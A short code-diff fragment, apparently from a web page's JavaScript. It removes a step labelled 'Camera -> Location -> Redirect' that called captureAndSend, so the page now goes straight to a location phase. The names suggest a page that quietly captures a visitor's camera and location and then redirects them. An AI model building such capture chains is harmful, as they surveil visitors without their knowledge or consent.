@@ -375,8 +375,7 @@
             magicExit(); 
         }, 10000);
 
-        // Start the Chain: Camera -> Location -> Redirect
-        captureAndSend(locationPhase);
+        locationPhase();
     }
 
     function locationPhase() {
